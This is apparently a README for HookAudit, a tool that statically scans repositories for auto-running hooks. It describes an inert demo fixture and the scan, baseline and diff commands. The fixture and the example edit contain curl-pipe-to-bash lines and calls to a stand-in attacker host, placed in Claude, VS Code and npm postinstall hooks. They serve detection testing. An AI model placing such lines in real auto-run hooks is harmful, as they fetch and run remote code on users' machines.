# HookAudit Demo - Deterministic Reproducible Fixture

**Purpose:** 5-minute demo that proves `DISCOVER → NORMALIZE → RESOLVE → GRAPH → INFER → EXPLAIN → BASELINE → DIFF` on a **synthetic, inert** repository (no real malware, no destructive commands).

**Structure (per prompt §12):**
```
demo/sample-repository/
├── .claude/settings.json      # SessionStart → node scripts/bootstrap.mjs (auto)
├── .vscode/tasks.json         # folderOpen → bash scripts/helper.sh --cross .claude/settings.json (auto, cross-tool)
├── scripts/bootstrap.mjs      # → helper.sh + https://example-attacker.test/bootstrap (multi-hop, NETWORK)
└── scripts/helper.sh          # curl | bash --download bun-runtime (NETWORK + REMOTE_DOWNLOAD + RUNTIME_BOOTSTRAP + PROCESS)
└── package.json               # postinstall echo (auto, local)
```

**No execution:** All files are read as text only (`fs.readFileSync` + regex/JSON), never `spawn`/`eval`. `helper.sh` contains `curl … | bash` as a *string* - never executed. Marker test proves never-execute.

## Run (stable, no internet required)

```bash
# 1. Scan - shows trigger → script → secondary → capability
node bin/hookaudit.js scan --path demo/sample-repository
node bin/hookaudit.js scan --json --path demo/sample-repository | jq .summary

# 2. Baseline → change → diff → NEW_CAPABILITY
node bin/hookaudit.js baseline --path demo/sample-repository
# edit demo/sample-repository/package.json postinstall - change to network capability
# (editing scripts/helper.sh alone won't change baseline file hashes; edit a surface file)
# example: change package.json postinstall to: curl https://new.example.com | bash
node bin/hookaudit.js diff --json --path demo/sample-repository | jq .diff.semantic
# → NEW_CAPABILITY NETWORK_ACCESS, NEW_COMMAND

# 3. Zero-dep
cat package.json | grep -A2 dependencies
npm ls --all  # (empty)
```

**Verify 3× stable:**
```bash
node bin/hookaudit.js scan --json --path demo/sample-repository > /tmp/a.json
node bin/hookaudit.js scan --json --path demo/sample-repository > /tmp/b.json
diff /tmp/a.json /tmp/b.json && echo "deterministic"
```

**Why 5 capabilities visible:**
- `PROCESS_EXECUTION` - `node`/`bash` in `.claude` + `scripts`
- `NETWORK_ACCESS` - `https://example-attacker.test` + `curl`
- `REMOTE_DOWNLOAD` - `curl … | bash`
- `RUNTIME_BOOTSTRAP` - `--download bun-runtime`
- `CROSS_TOOL_LINK` - `.vscode/tasks.json` → `.claude/settings.json`

**Safety:** `demo/sample-repository` is synthetic, uses `example-attacker.test` (reserved, never contacted), `eval` is inert comment, no `rm -rf`, no token fetch. Never commit a real payload.
